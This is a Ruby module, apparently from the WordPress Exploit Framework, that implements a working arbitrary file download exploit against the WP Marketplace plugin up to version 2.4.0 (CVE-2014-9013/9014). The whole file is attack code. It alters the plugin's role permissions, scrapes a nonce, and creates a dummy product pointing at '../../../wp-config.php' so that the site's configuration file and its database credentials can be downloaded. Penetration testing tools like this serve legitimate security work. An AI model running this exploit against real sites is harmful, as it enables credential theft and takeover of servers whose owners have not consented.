class Wpxf::Auxiliary::WpMarketplaceV24FileDownload < Wpxf::Module
  include Wpxf::WordPress::FileDownload

  def initialize
    super

    update_info(
      name: 'WP Marketplace <= 2.4.0 Arbitrary File Download',
      desc: %(
        This module exploits a vulnerability which allows registered users of any level
        to download any arbitrary file accessible by the user the web server is running as.
      ),
      author: [
        'Kacper Szurek',                  # Disclosure
        'Rob Carr <rob[at]rastating.com>' # WPXF module
      ],
      references: [
        ['WPVDB', '7861'],
        ['CVE', '2014-9013'],
        ['CVE', '2014-9014'],
        ['URL', 'http://security.szurek.pl/wp-marketplace-240-arbitrary-file-download.html']
      ],
      date: 'Mar 21 2015'
    )

    register_options([
      StringOption.new(
        name: 'user_role',
        desc: 'The role of the user account being used for authentication',
        default: 'Subscriber',
        required: true
      )
    ])
  end

  def check
    check_plugin_version_from_changelog('wpmarketplace', 'readme.txt', '2.4.1')
  end

  def requires_authentication
    true
  end

  def default_remote_file_path
    '../../../wp-config.php'
  end

  def working_directory
    'wp-content/plugins/wpmarketplace'
  end

  def modify_plugin_permissions
    res = execute_post_request(
      url: full_uri,
      body: {
        'action'                      => 'wpmp_pp_ajax_call',
        'execute'                     => 'wpmp_save_settings',
        '_wpmp_settings[user_role][]' => datastore['user_role'].downcase
      },
      cookie: session_cookie
    )

    unless res && res.code == 200 && res.body =~ /Settings Saved Successfully/i
      emit_error 'Failed to modify the plugin permissions'
      return false
    end

    true
  end

  def fetch_ajax_nonce
    res = execute_post_request(
      url: full_uri,
      body: {
        'action'  => 'wpmp_pp_ajax_call',
        'execute' => 'wpmp_front_add_product'
      },
      cookie: session_cookie
    )

    return nil if !res || res.code != 200
    nonce = res.body[/name="__product_wpmp" value="([^"]+)"/i, 1]

    unless nonce
      emit_error 'Failed to acquire a download nonce'
      emit_error res.inspect, true
      return false
    end

    nonce
  end

  def create_product
    res = execute_post_request(
      url: full_uri,
      body: {
        '__product_wpmp' => @nonce,
        'post_type' => 'wpmarketplace',
        'id' => @download_id,
        'wpmp_list[base_price]' => '0',
        'wpmp_list[file][]' => remote_file
      },
      cookie: session_cookie
    )

    unless res && (res.code == 200 || res.code == 302)
      emit_error 'Failed to create dummy product'
      emit_error res.inspect, true
      return false
    end

    true
  end

  def before_download
    return false unless modify_plugin_permissions
    emit_info 'Modified plugin permissions successfully', true

    @nonce = fetch_ajax_nonce
    return false unless @nonce

    emit_info "Acquired nonce \"#{@nonce}\"", true
    @download_id = "1#{Utility::Text.rand_numeric(5)}"

    create_product
  end

  def download_request_method
    :post
  end

  def downloader_url
    full_uri
  end

  def download_request_params
    { 'wpmpfile' => @download_id }
  end
end
